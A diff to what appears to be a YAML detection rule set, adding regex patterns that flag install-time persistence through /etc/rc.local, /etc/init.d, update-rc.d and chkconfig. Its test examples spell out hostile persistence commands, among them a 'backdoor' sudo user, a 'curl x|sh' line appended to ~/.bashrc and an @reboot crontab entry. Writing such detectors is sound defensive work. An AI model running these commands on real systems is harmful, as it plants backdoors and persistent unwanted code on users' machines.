@@ -455,6 +455,9 @@ rules:
         # /dev/null` has a redirect AFTER the path and writes nothing to it; a write
         # puts the redirect first, which the alternative above already covers.
         - '\bsystemctl\s+(?:--user\s+)?enable\b'
+        - '\b(?:cp|mv|install|ln|tee|touch)\b[^\n]{0,100}?/etc/(?:init\.d/|rc\.local\b)'
+        - '>[ \t]{0,8}[^\n]{0,60}?/etc/(?:init\.d/|rc\.local\b)'
+        - '\bupdate-rc\.d\s+\S+\s+(?:defaults|enable)\b|\bchkconfig\s+(?:--add\s+\S|\S+\s+on\b)'
         - '\blaunchctl\s+(?:load|bootstrap)\b'
         # A process manager keeping the code running past the install and starting it again: pm2's
         # `start` (it restarts what it runs), `startup` and `save` (at boot), forever's `start`
@@ -481,6 +484,8 @@ rules:
         - "systemctl --user enable svc.service"
         - "launchctl bootstrap gui/501 ~/Library/LaunchAgents/svc.plist"
         - "usermod -aG sudo backdoor"
+        - "echo '/opt/x/run &' >> /etc/rc.local"
+        - "sudo cp selenium /etc/init.d/selenium && update-rc.d selenium defaults"
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
         - "crontab -u root -"
